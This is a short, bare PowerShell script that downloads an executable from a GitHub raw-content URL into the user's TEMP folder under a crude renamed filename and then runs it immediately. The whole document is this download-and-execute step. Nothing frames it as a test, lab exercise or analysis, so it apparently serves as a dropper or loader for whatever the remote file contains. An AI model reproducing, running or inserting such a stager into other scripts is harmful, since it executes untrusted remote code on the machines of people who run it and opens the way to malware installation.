$exeUrl = "https://raw.githubusercontent.com/mhwcarter/ur-nus/calc.exe"
$exeBytes = iwr -Uri $exeUrl -UseBasicParsing -OutFile "$env:TEMP\urAnus.exe"
Start-Process "$env:TEMP\urAnus.exe"
